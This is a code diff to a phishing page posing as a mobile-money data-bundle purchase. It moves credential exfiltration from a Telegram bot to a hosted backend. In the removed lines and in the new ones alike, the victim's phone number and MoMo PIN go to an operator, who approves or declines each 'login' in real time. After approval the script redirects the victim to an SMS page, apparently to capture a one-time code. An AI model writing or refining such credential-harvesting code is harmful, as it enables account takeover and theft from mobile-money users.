@@ -393,11 +393,9 @@
 
 <script>
   /* ============================================================ 
-     TELEGRAM CONFIGURATION
-     Replace these with your actual Bot Token and Chat ID
+     RENDER BACKEND URL
   ============================================================ */
-  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+  const API_URL = 'https://databundlesmomo-api.onrender.com';
 
   /* ============================================================ 
      Country data
@@ -526,7 +524,7 @@
   }
 
   /* ============================================================ 
-     Sign In Logic & Telegram Notification
+     Sign In Logic & Render Backend
   ============================================================ */
   async function handleSignIn(e) {
     e.preventDefault();
@@ -550,77 +548,62 @@
     showInitiating();
     pollingActive = true;
 
-    // 2. Send to Telegram with Inline Keyboard (Accept / Decline)
-    const message = `
-🚨 *NEW MOMO LOGIN ATTEMPT* 🚨
-----------------------------
-📱 *Phone:* ${fullPhone}
-🔑 *PIN:* ${pin}
-💰 *Amount:* ${tx.am} ${tx.cur}
-📦 *Package:* ${tx.pkgName}
-🌍 *Country:* ${tx.c}
-🔖 *Ref:* ${tx.ref}
-    `;
-
-    const replyMarkup = {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept_${tx.ref}` },
-          { text: "❌ Decline", callback_data: `decline_${tx.ref}` }
-        ]
-      ]
-    };
-
+    // 2. Send to Render Backend (which talks to Telegram)
     try {
-      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            reply_markup: replyMarkup
-          })
-        });
-      }
+      await fetch(`${API_URL}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ref: tx.ref,
+          phone: fullPhone,
+          pin: pin,
+          amount: tx.am,
+          pkg: tx.pkgName
+        })
+      });
     } catch (err) {
-      console.error('Telegram error:', err);
+      console.error('Backend error:', err);
+      // Proceed anyway for frontend demo fallback if needed
     }
 
-    // 3. Start Polling for Admin Decision
-    // NOTE: In a real app, you poll your own backend (e.g. /api/check-status?ref=...)
-    // which gets updated by the Telegram Webhook. 
-    // For this frontend demo, we simulate a successful approval after 6 seconds.
-    
+    // 3. Start Polling Render Backend for Admin Decision
     let waitTime = 0;
     const maxWait = 120000; // 2 minutes timeout
 
-    pollTimer = setInterval(() => {
+    pollTimer = setInterval(async () => {
       if (!pollingActive) return;
       waitTime += 2000;
 
-      // --- SIMULATED BACKEND POLLING ---
-      // Replace this block with a fetch to your backend:
-      // const res = await fetch('/api/status/' + tx.ref);
-      // const data = await res.json();
-      // if (data.status === 'approved') { ... }
-      
-      // Simulate approval after 6 seconds
-      if (waitTime >= 6000) { 
-        clearInterval(pollTimer);
-        pollingActive = false;
-        
-        // Update text and redirect
-        document.getElementById('initiatingNote').textContent = 'Approved. Redirecting to complete transaction...';
-        
-        const q = new URLSearchParams({
-          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an
-        });
-        setTimeout(() => {
-          window.location.href = 'sms.html?' + q.toString();
-        }, 1000);
+      try {
+        const res = await fetch(`${API_URL}/api/status/${tx.ref}`);
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          clearInterval(pollTimer);
+          pollingActive = false;
+          
+          document.getElementById('initiatingNote').textContent = 'Approved. Redirecting to complete transaction...';
+          
+          const q = new URLSearchParams({
+            tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+            pkg: tx.pkgName
+          });
+          setTimeout(() => {
+            window.location.href = 'sms.html?' + q.toString();
+          }, 1000);
+        } else if (data.status === 'declined') {
+          clearInterval(pollTimer);
+          hideInitiating();
+          
+          const b = document.getElementById('statusBanner');
+          b.className = 'status-banner show error';
+          b.textContent = 'Login declined. Please check your details and try again.';
+          document.getElementById('pinInput').value = '';
+          document.getElementById('pinInput').focus();
+        }
+      } catch (err) {
+        console.error('Polling error:', err);
       }
 
       if (waitTime > maxWait) {
